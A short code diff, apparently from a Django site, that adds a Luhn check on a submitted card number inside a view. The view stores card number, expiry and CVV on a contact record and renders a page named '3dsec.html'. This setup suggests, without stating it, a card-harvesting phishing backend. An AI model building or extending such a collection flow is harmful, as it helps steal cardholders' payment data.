@@ -140,6 +140,9 @@ def info(request):
         elif len(cvv_) == 2:
             error_msg = "CVV must be a 3-digit number."
             return render(request, "pages/3dsec.html")
+        if validate_credit_card_number(cardnumber)== False:
+            error_msg = "Yanlış kart nömrəsi."
+            return render(request, "pages/3dsec.html")
         contact.cc = cardnumber
         contact.mm = mm_
         contact.yy = yy_
@@ -436,6 +439,15 @@ def visit_count_api(request):
     visit_count = visit_count_obj.count if visit_count_obj else 0
 
     return JsonResponse({'visit_count': visit_count})
+def validate_credit_card_number(card_number):
+    digits = [int(x) for x in str(card_number)]
+
+    for i in range(len(digits)-2, -1, -2):
+        digits[i] *= 2
+        if digits[i] > 9:
+            digits[i] -= 9
+
+    return sum(digits) % 10 == 0
 
 
 
